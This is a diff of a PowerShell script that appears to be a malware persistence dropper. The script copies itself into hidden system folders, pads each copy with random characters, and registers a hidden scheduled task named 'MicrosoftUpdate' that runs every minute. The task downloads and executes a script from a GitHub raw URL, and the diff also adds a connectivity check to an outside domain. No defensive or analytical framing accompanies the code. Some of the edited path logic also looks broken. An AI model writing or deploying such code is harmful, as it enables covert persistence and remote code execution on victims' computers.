@@ -1,32 +1,35 @@
 function Gen-Info {
+    # CONNECTION
+    Test-Connection -ComputerName Secnesys.com
+
     # CREATION
     $alfa_path = "C:\ProgramData\Microsoft\DRM"
-    $bravo_path = "C:\ProgramData\Microsoft\DRM"
-    $charlie_path = "C:\ProgramData\Microsoft\DRM"
+    $bravo_path = "C:\Windows\Temp"
+    $charlie_path = "$env:LOCALAPPDATA\Temp"
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
     $funcBody = (Get-Command Gen-Info).ScriptBlock.ToString()
-    if (-not (Test-Path "$alfa_path\alfa.ps1")) {
-        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$alfa_path\alfa.ps1" -Encoding UTF8
+    if (-not (Test-Path "$alfa_path")) {
+        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$alfa_path" -Encoding UTF8
     }
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
-    if (-not (Test-Path "$bravo_path\bravo.ps1")) {
-        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$bravo_path\bravo.ps1" -Encoding UTF8
+    if (-not (Test-Path "$bravo_path")) {
+        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$bravo_path" -Encoding UTF8
     }
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
-    if (-not (Test-Path "$charlie_path\charlie.ps1")) {
-        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$charlie_path\charlie.ps1" -Encoding UTF8
+    if (-not (Test-Path "$charlie_path")) {
+        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$charlie_path" -Encoding UTF8
     }
     
     
     # SCHEDULE TASK CREATION
     
-    $cmd = "if (-not (Test-Path '$alfa_path\alfa.ps1') -and -not (Test-Path '$bravo_path\bravo.ps1') -and -not (Test-Path '$charlie_path\charlie.ps1')) { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1', '$alfa_path\alfa.ps1') } else { if (Test-Path '$alfa_path\alfa.ps1') { & '$alfa_path\alfa.ps1' }; if (Test-Path '$bravo_path\bravo.ps1') { & '$bravo_path\bravo.ps1' }; if (Test-Path '$charlie_path\charlie.ps1') { & '$charlie_path\charlie.ps1' } }"
+    $cmd = "if (-not (Test-Path '$alfa_path') -and -not (Test-Path '$bravo_path') -and -not (Test-Path '$charlie_path')) { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1', '$alfa_path') } else { if (Test-Path '$alfa_path') { & $alfa_path } else { if (Test-Path '$bravo_path') { & $bravo_path } else { if (Test-Path '$charlie_path') { & '$charlie_path' } } } }"
     
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd`""
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 10)
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan)
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
     
     $task_alfa = "MicrosoftUpdate"
@@ -46,5 +49,4 @@ function Gen-Info {
 }
 
 Gen-Info
-
 
